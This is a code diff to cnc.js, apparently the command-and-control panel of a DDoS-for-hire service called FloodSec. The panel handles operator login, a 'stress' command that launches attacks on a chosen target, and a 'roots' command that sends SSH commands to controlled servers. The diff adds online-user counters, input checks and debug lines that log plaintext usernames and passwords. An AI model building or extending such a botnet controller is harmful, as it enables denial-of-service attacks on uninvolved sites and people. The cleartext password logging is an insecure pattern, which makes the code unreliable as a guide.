@@ -37,7 +37,7 @@ Server.svr.on('connection', async function(socket) {
     /* Getting Connecting User IP/PORT */
     Server.setInfo(socket.remoteAddress.replace("::ffff:", ""), socket.remotePort);
 
-    eExtra.set_Title("FloodSec IV | [API]: 1 | [Roots]: " + bots.rootCOUNT(), socket)
+    eExtra.set_Title("FloodSec IV | [API]: 1 | [Roots]: " + bots.rootCOUNT() + " | [Online Users]: " + eCrud.CurrentOnlineCount(), socket)
 
     /* Showing the connecting user on server side terminal! */
     console.log('A new connection has been established\r\nClient IP: ' + Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT + "\r\n");
@@ -55,8 +55,10 @@ Server.svr.on('connection', async function(socket) {
     //Get Username
     socket.write(Banners.login_b());
     eExtra.set_cursor(9, 37, socket);
-    eExtra.set_Title("FloodSec VI | Welcome to bypass land | [APIs]: 1 | [Roots]: " + bots.rootCOUNT(), socket);
+    eExtra.set_Title("FloodSec VI | Welcome to bypass land | [APIs]: 1 | [Roots]: " + bots.rootCOUNT() + " | [Online Users]: " + eCrud.CurrentOnlineCount(), socket);
     eConfig.CurrentLogin.Username = await ServerFunc.getInput(socket, "");
+    if(eConfig.CurrentLogin.Username === null || eConfig.CurrentLogin.Username === "undefined" || (eConfig.CurrentLogin.Username).length < 3) { socket.write("Something went wrong!\r\n");  eConfig.CurrentLogin.Username = await ServerFunc.getInput(socket, ""); }
+    console.log("eConfig.CurrentLogin.Username:60 - " + eConfig.CurrentLogin.Username);
 
     socket.write(Config.Colors.Clear);
 
@@ -64,11 +66,14 @@ Server.svr.on('connection', async function(socket) {
     socket.write(Banners.login_v());
     eExtra.set_cursor(9, 37, socket);
     eConfig.CurrentLogin.Password = await ServerFunc.getInput(socket, "");
+    if(eConfig.CurrentLogin.Password === null || eConfig.CurrentLogin.Password === "undefined") { socket.write("Something went wrong!\r\n");  eConfig.CurrentLogin.Password = await ServerFunc.getInput(socket, ""); }
+    console.log("eConfig.CurrentLogin.Password:68 [cnc.js] - " + eConfig.CurrentLogin.Password);
 
     /* Get User Input In A Loop */
 
     socket.write(Config.Colors.Clear);
     let login_resp = Auth.login(eConfig.CurrentLogin.Username, eConfig.CurrentLogin.Password, socket.remoteAddress.replace("::ffff:", ""));
+    console.log("login_resp:74 [cnc.js] - " + login_resp + "\r\n");
     if(login_resp.includes("Successfully")) {
         eConfig.CurrentLogin.Username = "";
         eConfig.CurrentLogin.Password = "";
@@ -97,41 +102,43 @@ Server.svr.on('connection', async function(socket) {
         socket.setEncoding('utf8');
         let inputCMD = data.toString().replace(/(\r\n|\n|\r)/gm,"");
         let Current = await Crud.GetCurrentUser(socket.remoteAddress.replace("::ffff:", "")).split(",");
+        console.log("Current:102 [cnc.js] - " + Current);
         await eConfig.GetUserInfo(Current[0]);
+        console.log(eConfig.CurrentUser.Username + " | " + eConfig.CurrentUser.Password);
         eConfig.GetCmd(inputCMD);
-        eExtra.set_Title("FloodSec VI | Welcome to bypass land | [APIs]: 1 | [Roots]: " + bots.rootCOUNT() + " | [Operator]: " + Current[0], socket);
+        eExtra.set_Title("FloodSec VI | Welcome to bypass land | [APIs]: 1 | [Roots]: " + bots.rootCOUNT() + " | [Online Users]: " + eCrud.CurrentOnlineCount() + " | [Operator]: " + eConfig.CurrentUser.Username, socket);
 
         if(eConfig.CurrentCmd.Cmd === "help" || eConfig.CurrentCmd.Cmd === "?") {
-            socket.write(Config.Colors.Clear + Banners.main_b() + Banners.help_list() + Config.hostname(Current[0]));
+            socket.write(Config.Colors.Clear + Banners.main_b() + Banners.help_list() + Config.hostname(eConfig.CurrentUser.Username));
         } else if(eConfig.CurrentCmd.Cmd === "clear" || eConfig.CurrentCmd.Cmd === "cls") {
-            socket.write(Config.Colors.Clear + Banners.main_b() + Config.hostname(Current[0]));
+            socket.write(Config.Colors.Clear + Banners.main_b() + Config.hostname(eConfig.CurrentUser.Username));
         } else if(eConfig.CurrentCmd.Cmd === "geo") {
             let ip = eConfig.CurrentCmd.arg[1];
             let result = await eExtra.GeoIP(ip)
-            socket.write(result + Config.hostname(Current[0]));
+            socket.write(result + Config.hostname(eConfig.CurrentUser.Username));
         } else if(eConfig.CurrentCmd.Cmd === "scan") {
             let ip = eConfig.CurrentCmd.arg[1];
             let result = await eExtra.GeoIP(ip);
-            socket.write(result + Config.hostname(Current[0]));
+            socket.write(result + Config.hostname(eConfig.CurrentUser.Username));
         } else if(eConfig.CurrentCmd.Cmd === "myinfo") {
-            socket.write(eCrud.show_stats(Current[0]) + Config.hostname(Current[0]))
+            socket.write(eCrud.show_stats(eConfig.CurrentUser.Username) + Config.hostname(eConfig.CurrentUser.Username))
         } else if(eConfig.CurrentCmd.Cmd === "change_pw") {
-            socket.write(Crud.changePassword(Current[0], eConfig.CurrentCmd.arg[1]) + Config.hostname(Current[0]));
+            socket.write(Crud.changePassword(eConfig.CurrentUser.Username, eConfig.CurrentCmd.arg[1]) + Config.hostname(eConfig.CurrentUser.Username));
         } else if(eConfig.CurrentCmd.Cmd === "stress") {
             /*
             *      STRESSER SECTION
             */
             console.log(eConfig.CurrentCmd.arg);
-            socket.write(await eExtra.send_attack(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(Current[0]));
+            socket.write(await eExtra.send_attack(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(eConfig.CurrentUser.Username));
         } else if(eConfig.CurrentCmd.Cmd === "methods") {
-            socket.write(Config.Colors.Clear + Banners.main_b() + Banners.methods() + Config.hostname(Current[0]));
+            socket.write(Config.Colors.Clear + Banners.main_b() + Banners.methods() + Config.hostname(eConfig.CurrentUser.Username));
         } else if(eConfig.CurrentCmd.Cmd === "roots") {
-            socket.write(bots.SendSSHCmd(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(Current[0]));
+            socket.write(bots.SendSSHCmd(eConfig.CurrentCmd.arg[1], eConfig.CurrentCmd.arg[2], eConfig.CurrentCmd.arg[3], eConfig.CurrentCmd.arg[4]) + Config.hostname(eConfig.CurrentUser.Username));
         } else if(eConfig.CurrentCmd.Cmd === "admin") {
             /*
             *       ADMIN SECTION 
             */
-            if(eCrud.isAdmin(Current[0]) || eConfig.CurrentUser.isAdmin === true) {
+            if(eCrud.isAdmin(eConfig.CurrentUser.Username) || eConfig.CurrentUser.isAdmin === true) {
                 let tool = eConfig.CurrentCmd.arg[1];
                 let arg2 = eConfig.CurrentCmd.arg[2];
                 let arg3 = eConfig.CurrentCmd.arg[3];
@@ -141,29 +148,29 @@ Server.svr.on('connection', async function(socket) {
                 let arg7 = eConfig.CurrentCmd.arg[7];
                 if(tool === "add") {
                     let resp = Crud.addUser(arg2, arg3, arg4, arg5, arg6);
-                    socket.write(resp + Config.hostname(Current[0]));                    
+                    socket.write(resp + Config.hostname(eConfig.CurrentUser.Username));                    
                 } else if(tool === "remove") {
-                    socket.write(Crud.removeUser(arg2) + Config.hostname(Current[0]));
+                    socket.write(Crud.removeUser(arg2) + Config.hostname(eConfig.CurrentUser.Username));
                 } else if(tool === "update") {
-                    socket.write(Crud.userUpdate(arg2, arg3, arg4, arg5) + Config.hostname(Current[0]));
+                    socket.write(Crud.userUpdate(arg2, arg3, arg4, arg5) + Config.hostname(eConfig.CurrentUser.Username));
                 } else if(tool === "change_motd") {
                     let msg = eExtra.CleanMOTD(eConfig.CurrentCmd.arg);
-                    socket.write(Crud.change_motd(msg.replace(eConfig.CurrentCmd.arg[0] + " " + eConfig.CurrentCmd.arg[1], ""))+ Config.hostname(Current[0]));
+                    socket.write(Crud.change_motd(msg.replace(eConfig.CurrentCmd.arg[0] + " " + eConfig.CurrentCmd.arg[1], ""))+ Config.hostname(eConfig.CurrentUser.Username));
                 } else if(tool === "reset_ip") {
-                    socket.write(Crud.resetIP(arg2, arg3) + Config.hostname(Current[0]));
+                    socket.write(Crud.resetIP(arg2, arg3) + Config.hostname(eConfig.CurrentUser.Username));
                 } else if(tool === "change_pw") {
-                    socket.write(Crud.changePassword(arg2, arg3) + Config.hostname(Current[0]));
+                    socket.write(Crud.changePassword(arg2, arg3) + Config.hostname(eConfig.CurrentUser.Username));
                 } else {
-                    socket.write(Config.Colors.Clear + Banners.main_b() + Banners.admin_list() + Config.hostname(Current[0]));
+                    socket.write(Config.Colors.Clear + Banners.main_b() + Banners.admin_list() + Config.hostname(eConfig.CurrentUser.Username));
                 }
             } else {
-                socket.write("[x] Error, You aren't admin to use this command!\r\n" + Config.hostname(Current[0]));
+                socket.write("[x] Error, You aren't admin to use this command!\r\n" + Config.hostname(eConfig.CurrentUser.Username));
             }
         } else {
-            socket.write("[x] Error, No command found!\r\n" + Config.hostname(Current[0]));
+            socket.write("[x] Error, No command found!\r\n" + Config.hostname(eConfig.CurrentUser.Username));
         }
         await eConfig.ResetUserInfo();
-        eExtra.log_action("CMD", Current[0], Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT);
+        eExtra.log_action("CMD", eConfig.CurrentUser.Username, Server.Socket_Info.UserIP + ":" + Server.Socket_Info.UserPORT);
     })
         
 
